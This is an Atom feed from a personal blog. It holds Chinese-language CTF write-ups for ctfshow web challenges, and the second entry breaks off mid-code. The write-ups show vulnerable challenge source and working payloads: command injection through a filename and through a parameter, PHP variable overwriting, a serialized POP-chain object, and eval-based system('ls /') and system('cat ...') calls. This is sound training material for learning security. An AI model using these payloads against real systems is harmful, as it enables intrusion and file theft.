<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>梦~醒🥝</title>
  
  
  <link href="https://m3ngx1ng.github.io/atom.xml" rel="self"/>
  
  <link href="https://m3ngx1ng.github.io/"/>
  <updated>2024-12-01T16:06:22.802Z</updated>
  <id>https://m3ngx1ng.github.io/</id>
  
  <author>
    <name>梦~醒🥝</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ctfshow刷题</title>
    <link href="https://m3ngx1ng.github.io/posts/7acd7e04.html"/>
    <id>https://m3ngx1ng.github.io/posts/7acd7e04.html</id>
    <published>2024-12-01T14:09:31.082Z</published>
    <updated>2024-12-01T16:06:22.802Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><p>来源：ctfshow</p><h4 id="easyPytHon-P">easyPytHon_P</h4><blockquote><p>考点：代码审计，源代码查看</p></blockquote><blockquote><p>打开后查看源码，发现一个源码地址，打开看看</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109150901508.png" alt="image-20241109150901508"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109150915342.png" alt="image-20241109150915342"></p><blockquote><p>可以知道在此目录下有个flag.txt文件，再观察源码</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask import request</span><br><span class="line">cmd: str = request.form.<span class="built_in">get</span>(<span class="string">&#x27;cmd&#x27;</span>)</span><br><span class="line">param: str = request.form.<span class="built_in">get</span>(<span class="string">&#x27;param&#x27;</span>)</span><br><span class="line"><span class="comment"># ------------------------------------- Don&#x27;t modify ↑ them ↑! But you can write your code ↓</span></span><br><span class="line">import subprocess, os</span><br><span class="line"><span class="keyword">if</span> cmd is <span class="keyword">not</span> None <span class="keyword">and</span> param is <span class="keyword">not</span> None:</span><br><span class="line">    try:</span><br><span class="line">        tVar = subprocess.<span class="built_in">run</span>([cmd[:3], param, __file__], <span class="attribute">cwd</span>=os.getcwd(), <span class="attribute">timeout</span>=5)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Done!&#x27;</span>)</span><br><span class="line">    except subprocess.TimeoutExpired:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Timeout!&#x27;</span>)</span><br><span class="line">    except:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Error!&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;No Flag!&#x27;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>发现传入两个参数cmd和param，会截取cmd的前三个字符当成命令run，param被当成参数。</p><p>所以直接构造cat flag.txt</p><p>payload:</p></blockquote><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cmd</span><span class="language-bash">=<span class="built_in">cat</span>&amp;param=flag.txt</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109150800375.png" alt="image-20241109150800375"></p><blockquote><p>ctfshow{7d9cfcf5-9314-4eb0-9240-d77a6ca6f29d}</p></blockquote><h4 id="遍地飘零">遍地飘零</h4><blockquote><p>考点：$$值覆盖，$_GET全局变量和本地变量</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$zeros</span>=<span class="string">&quot;000000000000000000000000000000&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$flag</span>==<span class="string">&quot;000000000000000000000000000000&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;好多零&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;没有零，仔细看看输入有什么问题吧&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>分析代码可知，get传参的参数名会传给key，将key的值传给变量value。</p><p>然后进行变量值覆盖，将key的值当作变量名，将value的值也当作变量名，且赋值前者为后者。</p><p>例如：传递参数 ?get=aa，则$key=get,$value=$key=aa，</p><p>值覆盖时，$$key=$get，$$value=$aa</p><p>所以，目标是执行var_dump($flag)</p><p>构造payload:</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">_GET</span>=flag</span><br></pre></td></tr></table></figure><blockquote><p>传进去时，$key=_GET,$value=flag，再进行值覆盖，就变成了</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_GET=$flag</span><br></pre></td></tr></table></figure><p>从而实现目标，得到flag</p><p>ctfshow{2fe8eb61-9f07-4713-a7f2-311a3e4786d3}</p></blockquote><h4 id="茶歇区">茶歇区</h4><blockquote><p>考点：多次整数溢出</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109160125845.png" alt="image-20241109160125845"></p><blockquote><p>先查看源码，找不到相关函数和score等计分的变量，所以不能通过控制台改代码了。</p><p>看到全是整数，想到整数溢出。先输入99999999999999999999</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109160320364.png" alt="image-20241109160320364"></p><blockquote><p>9223372036854775807</p><p>999999999999999999</p><p>输入999999999999999999，不断重复，直到出现flag</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109160421972.png" alt="image-20241109160421972"></p><blockquote><p>ctfshow{b31d09fc-4022-49ca-ad7d-ea533f98cdc2}</p></blockquote><h4 id="小舔田？">小舔田？</h4><blockquote><p>考点：序列化构造pop链</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Moon</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;月亮&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我是&quot;</span>.<span class="variable language_">$this</span>-&gt;name.<span class="string">&quot;快来赏我&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ion_Fan_Princess</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>=<span class="string">&quot;牛夫人&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">call</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;nickname==<span class="string">&quot;小甜甜&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;以前陪我看月亮的时候，叫人家小甜甜！现在新人胜旧人，叫人家&quot;</span>.<span class="variable language_">$this</span>-&gt;nickname.<span class="string">&quot;。\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;你以为我这么辛苦来这里真的是为了这条臭牛吗?是为了你这个没良心的臭猴子啊!\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">call</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;\t\t\t\t\t\t\t\t\t\t----&quot;</span>.<span class="variable language_">$this</span>-&gt;nickname;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Ion_Fan_Princess</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>进行代码审计，发现是个序列化题，有</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__toString</span>()和<span class="built_in">__wakeup</span>()</span><br></pre></td></tr></table></figure><p>构造一条pop链：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">call</span><span class="params">()</span></span> &lt;- Ion_Fan_Princess:<span class="built_in">__toString</span>() &lt;- Moon:<span class="built_in">__wakeup</span>()</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Moon&#123;</span><br><span class="line">    public <span class="variable">$name</span>;</span><br><span class="line">    public <span class="keyword">function</span> __toString()&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$this-</span><span class="built_in">&gt;name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public <span class="keyword">function</span> __wakeup()&#123;</span><br><span class="line">        echo <span class="string">&quot;我是&quot;</span>.<span class="variable">$this-</span><span class="built_in">&gt;name</span>.<span class="string">&quot;快来赏我&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Ion_Fan_Princess&#123;</span><br><span class="line">    public <span class="variable">$nickname</span>=<span class="string">&quot;小甜甜&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    public <span class="keyword">function</span> __toString()&#123;</span><br><span class="line">        <span class="variable">$this-</span>&gt;call();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;\t\t\t\t\t\t\t\t\t\t----&quot;</span>.<span class="variable">$this-</span>&gt;nickname;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = new Moon();</span><br><span class="line"><span class="variable">$a-</span><span class="built_in">&gt;name</span> = new Ion_Fan_Princess();</span><br><span class="line">echo urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line">?&gt;</span><br><span class="line">//O<span class="meta">%3A4</span><span class="meta">%3A</span><span class="meta">%22Moon</span><span class="meta">%22</span><span class="meta">%3A1</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A4</span><span class="meta">%3A</span><span class="meta">%22name</span><span class="meta">%22</span><span class="meta">%3BO</span><span class="meta">%3A16</span><span class="meta">%3A</span><span class="meta">%22Ion_Fan_Princess</span><span class="meta">%22</span><span class="meta">%3A1</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A8</span><span class="meta">%3A</span><span class="meta">%22nickname</span><span class="meta">%22</span><span class="meta">%3Bs</span><span class="meta">%3A9</span><span class="meta">%3A</span><span class="meta">%22</span><span class="meta">%E5</span><span class="meta">%B0</span><span class="meta">%8F</span><span class="meta">%E7</span><span class="meta">%94</span><span class="meta">%9C</span><span class="meta">%E7</span><span class="meta">%94</span><span class="meta">%9C</span><span class="meta">%22</span><span class="meta">%3B</span><span class="meta">%7D</span><span class="meta">%7D</span></span><br></pre></td></tr></table></figure><blockquote><p>ctfshow{ab725e26-0530-4535-8cb5-517419dccb8b}</p></blockquote><h4 id="LSB探姬">LSB探姬</h4><blockquote><p>考点：文件名中的命令执行</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109165919952.png" alt="image-20241109165919952"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*-coding:utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># File       : app.py</span></span><br><span class="line"><span class="string"># Time       ：2022/10/20 15:16</span></span><br><span class="line"><span class="string"># Author     ：g4_simon</span></span><br><span class="line"><span class="string"># version    ：python 3.9.7</span></span><br><span class="line"><span class="string"># Description：TSTEG-WEB</span></span><br><span class="line"><span class="string"># flag is in /app/flag.py</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment">#初始化全局变量</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():    </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">            f.save(<span class="string">&#x27;upload/&#x27;</span>+f.filename)</span><br><span class="line">            cmd=<span class="string">&quot;python3 tsteg.py upload/&quot;</span>+f.filename</span><br><span class="line">            result=os.popen(cmd).read()</span><br><span class="line">            data=&#123;<span class="string">&quot;code&quot;</span>:<span class="number">0</span>,<span class="string">&quot;cmd&quot;</span>:cmd,<span class="string">&quot;result&quot;</span>:result,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;file uploaded!&quot;</span>&#125;</span><br><span class="line">            <span class="keyword">return</span> jsonify(data)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            data=&#123;<span class="string">&quot;code&quot;</span>:<span class="number">1</span>,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;file upload error!&quot;</span>&#125;</span><br><span class="line">            <span class="keyword">return</span> jsonify(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_source</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;source.html&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>,debug=<span class="literal">False</span>)</span><br><span class="line">          </span><br></pre></td></tr></table></figure><blockquote><p>分析可知，执行cmd命令，所以进行命令执行漏洞利用，在filename后执行ls命令</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109170048538.png" alt="image-20241109170048538"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109170107042.png" alt="image-20241109170107042"></p><blockquote><p><a href="http://xn--flag-pm9f971itox.py">看到有flag.py</a>，执行命令cat <a href="http://flag.py">flag.py</a></p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109170155275.png" alt="image-20241109170155275"></p><blockquote><p>ctfshow{343152ec-5bd1-467a-9f6c-33d7d8d3cfc8}</p></blockquote><h4 id="Is-Not-Obfuscate">Is_Not_Obfuscate</h4><blockquote><p>考点：</p></blockquote><blockquote><p>打开后查看源码，发现端倪</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109171950520.png" alt="image-20241109171950520"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109172008208.png" alt="image-20241109172008208"></p><blockquote><p>先查看/robots.txt</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109172038816.png" alt="image-20241109172038816"></p><blockquote><p>查看/lib.php?flag=1</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109172117578.png" alt="image-20241109172117578"></p><blockquote><p>将这段复制到框中，再根据提示修改前端</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109172202256.png" alt="image-20241109172202256"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109172300276.png" alt="image-20241109172300276"></p><blockquote><p>然后得到一串代码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;lib.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="string">&#x27;./plugins/&#x27;</span>))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;./plugins/&#x27;</span>, <span class="number">0777</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Test it and delete it ！！！</span></span><br><span class="line"><span class="comment">//测试执行加密后的插件代码</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] === <span class="string">&#x27;test&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Anything is good?Please test it.&#x27;</span>;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="title function_ invoke__">decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;./plugins/&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;pull&#x27;</span>:</span><br><span class="line">            <span class="variable">$output</span> = @<span class="keyword">eval</span>(<span class="title function_ invoke__">decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./plugins/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>])));</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;pull success&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;push&#x27;</span>:</span><br><span class="line">            <span class="variable">$input</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./plugins/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;output&#x27;</span>].<span class="string">&#x27;youyou&#x27;</span>), <span class="title function_ invoke__">encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;output&#x27;</span>]));</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;push success&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p>看到了个eval函数，所以可以先利用push，再用pull执行命令。</p><p>首先，构造payload:</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=push&amp;output=<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="title function_ invoke__">system</span>(<span class="string">&quot;ls /&quot;</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>这个payload会经过file_put_contents()函数存储在目录下。然后用file_get_contents()函数在目录下读取。所以</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">input</span>=md5($_GET[<span class="string">&#x27;output&#x27;</span>].<span class="string">&#x27;youyou&#x27;</span>)。</span><br><span class="line">payload:</span><br><span class="line">?<span class="attribute">action</span>=pull&amp;input=b4b23ad51ccba6f288833a4e25cb361b</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109235359796.png" alt="image-20241109235359796"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109235416731.png" alt="image-20241109235416731"></p><blockquote><p>看到有个f1agaaa的文件，用同样的方式进行读取.</p><p>payload:</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?action=push&amp;output=<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /f1agaaa&quot;</span>));<span class="meta">?&gt;</span></span><br><span class="line">?action=pull&amp;input=ba53a5488a5dfda0aff1bb1ee5fcfaa2</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109235645962.png" alt="image-20241109235645962"></p><blockquote><p>ctfshow{876b2dd2-9785-4eb0-9a6d-7bf0a081bc5c}</p></blockquote>]]></content>
    
    
    <summary type="html">ctfshow刷题-wp</summary>
    
    
    
    <category term="CTF" scheme="https://m3ngx1ng.github.io/categories/CTF/"/>
    
    
    <category term="web-wp" scheme="https://m3ngx1ng.github.io/tags/web-wp/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow萌新web</title>
    <link href="https://m3ngx1ng.github.io/posts/72ad6da1.html"/>
    <id>https://m3ngx1ng.github.io/posts/72ad6da1.html</id>
    <published>2024-12-01T14:09:31.080Z</published>
    <updated>2024-12-01T16:06:22.801Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>来源：ctfshow</p></blockquote><p>[TOC]</p><h2 id="web1">web1</h2><blockquote><p>考点：inval()函数漏洞，sql注入</p></blockquote><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>ctf.show萌新计划web1<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span 